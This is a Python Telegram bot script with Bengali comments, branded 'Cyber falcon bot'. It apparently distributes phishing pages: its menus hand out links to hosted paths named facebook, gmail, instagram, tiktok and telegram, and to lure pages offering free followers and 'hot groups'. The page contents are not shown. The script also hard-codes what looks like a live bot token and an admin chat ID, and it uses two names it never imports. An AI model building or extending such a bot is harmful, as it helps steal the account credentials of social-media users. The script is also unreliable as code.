import asyncio
import logging
import requests
import json
import os
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes

# কনফিগারেশন
TELEGRAM_BOT_TOKEN = '7931517263:AAHTHHlaDNopwnvU1spYtlNahUH3FW2yO04'
YOUR_CHAT_ID = 7843284032

logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

# URL ফাইল (আপনার Render URL এখানে দিন)
RENDER_URL = "https://fc-bot-b3wy.onrender.com"

def save_url(url):
    try:
        with open('saved_url.json', 'w') as f:
            json.dump({'url': url}, f)
    except:
        pass

def load_url():
    try:
        if os.path.exists('saved_url.json'):
            with open('saved_url.json', 'r') as f:
                data = json.load(f)
                return data.get('url')
    except:
        pass
    return RENDER_URL

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """স্টার্ট কমান্ড - মেনু দেখায়"""
    query = update.callback_query
    if query:
        await query.answer()
        chat_id = query.message.chat.id
        message_id = query.message.message_id
        user_name = query.from_user.first_name
    else:
        chat_id = update.effective_chat.id
        message_id = None
        user_name = update.effective_user.first_name
    
    # ইউজার রেজিস্টার
    try:
        response = requests.get(f"http://localhost:5000/add_user/{chat_id}", timeout=2)
        if response.status_code != 200:
            print(f"User registration failed for {chat_id}")
    except Exception as e:
        print(f"Registration error: {e}")
    
    public_url = load_url()
    
    keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton("🌐 All Mane page", callback_data="menu_main")],
        [InlineKeyboardButton("📢 Advance page", callback_data="menu_advance")],
        [InlineKeyboardButton("🦅 Status", callback_data="status"),
         InlineKeyboardButton("🥷 Community", url="https://t.me/+j8x9Tp4CGa80ZmM1")]
    ])
    
    message = f"""
😈 🦅𝘾.𝙁 𝘽𝙤𝙩 𝙥𝙧𝙤😈🦅

𝙃𝙞 {user_name}😍🥰😘! 
𝙒𝙚𝙡𝙘𝙤𝙢𝙚 𝘾𝙮𝙗𝙚𝙧 𝙛𝙖𝙡𝙘𝙤𝙣 𝙗𝙤𝙩.

🥷𝗦𝘁𝗮𝘁𝘂𝘀: 🟢 𝗔𝗰𝘁𝗶𝘃𝗲
"""
    
    if message_id:
        await context.bot.edit_message_text(
            chat_id=chat_id,
            message_id=message_id,
            text=message,
            reply_markup=keyboard,
            parse_mode='Markdown'
        )
    else:
        await update.message.reply_text(message, reply_markup=keyboard, parse_mode='Markdown')

async def menu_main(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """মেন মেনু দেখায়"""
    query = update.callback_query
    await query.answer()
    
    keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton("📘 Facebook", callback_data="page_facebook")],
        [InlineKeyboardButton("🎵 TikTok", callback_data="page_tiktok")],
        [InlineKeyboardButton("✈️ Telegram", callback_data="page_telegram")],
        [InlineKeyboardButton("📧 Gmail", callback_data="page_gmail")],
        [InlineKeyboardButton("📷 Instagram", callback_data="page_instagram")],
        [InlineKeyboardButton("🤧Back🥴🤢", callback_data="back")]
    ])
    
    await query.edit_message_text(
        "😈 All Mane page Platforms\n\nSelect a platform:",
        reply_markup=keyboard
    )

async def menu_advance(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """অ্যাডভান্স মেনু দেখায়"""
    query = update.callback_query
    await query.answer()
    
    keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton("🎯 Free Followers", callback_data="adv_followers")],
        [InlineKeyboardButton("🤤 Hot Groups", callback_data="adv_groups")],
        [InlineKeyboardButton("🚀 TikTok Booster", callback_data="adv_boost")],
        [InlineKeyboardButton("💎 TikTok Followers", callback_data="adv_tiktok")],
        [InlineKeyboardButton("🤧Back🥴🤢", callback_data="back")]
    ])
    
    await query.edit_message_text(
        "📢 Advance page Menu\n\nSelect an option:",
        reply_markup=keyboard
    )

async def show_page(update: Update, context: ContextTypes.DEFAULT_TYPE, title: str, url_path: str):
    """পেজ লিংক দেখায়"""
    query = update.callback_query
    await query.answer()
    
    public_url = load_url()
    full_url = f"{public_url}/{url_path}"
    
    keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton("🌐 Open Page", url=full_url)],
        [InlineKeyboardButton("🤧Back🥴🤢", callback_data="back")]
    ])
    
    await query.edit_message_text(
        f"{title}\n\n🔗 {full_url}",
        reply_markup=keyboard
    )

async def status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """বট স্ট্যাটাস দেখায়"""
    query = update.callback_query
    await query.answer()
    
    public_url = load_url()
    
    keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton("🤧Back🥴🤢", callback_data="back")]
    ])
    
    # অ্যাক্টিভ ইউজার কাউন্ট পেতে লোকাল এপিআই কল
    active_users = 0
    try:
        response = requests.get("http://localhost:5000/get_ngrok_url", timeout=2)
        if response.status_code == 200:
            data = response.json()
            active_users = data.get('active_users', 0)
    except:
        pass
    
    message = f"""
📊 Bot Status

🦅 Status: 🟢 Active
🌐 URL: {public_url}
👥 Active Users: {active_users}
✅ All systems operational
"""
    await query.edit_message_text(message, reply_markup=keyboard)

async def back(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """ব্যাক বাটন - স্টার্ট মেনুতে ফেরত"""
    query = update.callback_query
    await query.answer()
    await start(update, context)

async def handle_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """সব ক্যালব্যাক হ্যান্ডলার"""
    query = update.callback_query
    data = query.data
    
    print(f"🔘 Callback received: {data}")
    
    if data == "menu_main":
        await menu_main(update, context)
    elif data == "menu_advance":
        await menu_advance(update, context)
    elif data == "status":
        await status(update, context)
    elif data == "back":
        await back(update, context)
    elif data == "page_facebook":
        await show_page(update, context, "📘 Facebook Link", "facebook")
    elif data == "page_tiktok":
        await show_page(update, context, "🎵 TikTok Link", "tiktok")
    elif data == "page_telegram":
        await show_page(update, context, "✈️ Telegram Link", "telegram")
    elif data == "page_gmail":
        await show_page(update, context, "📧 Gmail Link", "gmail")
    elif data == "page_instagram":
        await show_page(update, context, "📷 Instagram Link", "instagram")
    elif data == "adv_followers":
        await show_page(update, context, "🎯 Free Facebook Followers", "facebook_followers")
    elif data == "adv_groups":
        await show_page(update, context, "🤤 Hot WhatsApp Groups", "whatsapp_groups")
    elif data == "adv_boost":
        await show_page(update, context, "🚀 TikTok Booster", "tiktok_boost")
    elif data == "adv_tiktok":
        await show_page(update, context, "💎 TikTok Followers", "tiktok_followers")
    else:
        await query.answer("Unknown button")

async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """এরর হ্যান্ডলার"""
    print(f"❌ Error: {context.error}")

async def broadcast_to_all(message: str):
    """সব ইউজারকে মেসেজ পাঠান"""
    try:
        response = requests.get("http://localhost:5000/get_ngrok_url", timeout=2)
        if response.status_code == 200:
            data = response.json()
            active_users = data.get('active_users', [])
            if isinstance(active_users, list):
                for chat_id in active_users:
                    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
                    try:
                        requests.post(url, json={'chat_id': chat_id, 'text': message, 'parse_mode': 'Markdown'}, timeout=5)
                        print(f"✅ Broadcast to {chat_id}")
                    except:
                        pass
    except Exception as e:
        print(f"Broadcast error: {e}")

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """সাধারণ মেসেজ হ্যান্ডলার"""
    user_name = update.message.from_user.first_name
    chat_id = update.message.chat.id
    
    # ইউজার রেজিস্টার
    try:
        requests.get(f"http://localhost:5000/add_user/{chat_id}", timeout=2)
    except:
        pass
    
    # চেক করি এটা অ্যাডমিন ব্রডকাস্ট কিনা
    if chat_id == YOUR_CHAT_ID and update.message.text.startswith('/broadcast '):
        msg = update.message.text.replace('/broadcast ', '')
        await broadcast_to_all(f"📢 {msg}")
        await update.message.reply_text(f"✅ Broadcast পাঠানো হয়েছে")
    else:
        await update.message.reply_text(f'🙋 Hi {user_name}! Type /start to see the main menu.')

def run_bot():
    """বট চালানোর ফাংশন"""
    print("🦅 Starting Telegram Bot...")
    
    app = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
    
    # হ্যান্ডলার যোগ করুন
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("link", start))
    app.add_handler(CallbackQueryHandler(handle_callback))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    app.add_error_handler(error_handler)
    
    print("✅ Bot is polling for updates...")
    app.run_polling(allowed_updates=["message", "callback_query"])

if __name__ == '__main__':
    run_bot()
